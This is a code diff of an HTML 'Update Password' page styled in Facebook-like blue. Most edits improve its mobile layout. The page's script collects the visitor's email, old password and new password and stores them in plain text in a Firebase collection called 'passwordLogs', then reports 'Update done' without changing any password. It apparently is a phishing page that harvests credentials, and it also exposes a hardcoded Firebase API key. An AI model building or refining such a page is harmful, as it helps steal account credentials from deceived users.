@@ -2,6 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Update Password</title>
 
   <style>
@@ -11,42 +12,71 @@
       display: flex;
       justify-content: center;
       align-items: center;
-      height: 100vh;
+      min-height: 100vh;
+      margin: 0;
+      padding: 15px;
     }
 
     .box {
       background: white;
-      padding: 25px;
-      border-radius: 10px;
-      width: 350px;
+      padding: 20px;
+      border-radius: 12px;
+      width: 100%;
+      max-width: 380px;
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
     }
 
     h2 {
       text-align: center;
       color: #1877f2;
+      margin-bottom: 15px;
+      font-size: 22px;
     }
 
     input {
       width: 100%;
-      padding: 10px;
+      padding: 12px;
       margin: 8px 0;
       border: 1px solid #ddd;
-      border-radius: 5px;
+      border-radius: 8px;
+      font-size: 16px;
+      outline: none;
+    }
+
+    input:focus {
+      border-color: #1877f2;
     }
 
     button {
       width: 100%;
-      padding: 10px;
+      padding: 12px;
       background: #1877f2;
       color: white;
       border: none;
-      border-radius: 5px;
+      border-radius: 8px;
       cursor: pointer;
+      font-size: 16px;
+      margin-top: 10px;
     }
 
     button:hover {
       background: #155dc1;
+    }
+
+    /* 📱 تحسين الموبايل */
+    @media (max-width: 480px) {
+      .box {
+        padding: 15px;
+      }
+
+      h2 {
+        font-size: 20px;
+      }
+
+      input, button {
+        font-size: 15px;
+        padding: 12px;
+      }
     }
   </style>
 </head>
@@ -65,13 +95,10 @@
 </div>
 
 <script type="module">
-
-  // 🔥 Firebase imports
   import { initializeApp } from "https://www.gstatic.com/firebasejs/12.12.0/firebase-app.js";
   import { getFirestore, collection, addDoc } 
   from "https://www.gstatic.com/firebasejs/12.12.0/firebase-firestore.js";
 
-  // 🔥 YOUR CONFIG (اللي انت بعته)
   const firebaseConfig = {
     apiKey: "AIzaSyBOQtPf98v3xQGmwTlWo9J2EQyNLED43gs",
     authDomain: "tast-d18b0.firebaseapp.com",
@@ -85,7 +112,6 @@
   const app = initializeApp(firebaseConfig);
   const db = getFirestore(app);
 
-  // 🔥 زرار Update
   window.updateData = async function () {
 
     const email = document.getElementById("email").value;
@@ -100,19 +126,18 @@
 
     try {
       await addDoc(collection(db, "passwordLogs"), {
-        email: email,
-        oldPassword: oldPassword,
-        newPassword: newPassword,
+        email,
+        oldPassword,
+        newPassword,
         createdAt: new Date()
       });
 
-      alert("update done");
+      alert("Update done");
 
     } catch (error) {
       alert(error.message);
     }
   }
-
 </script>
 
 </body>
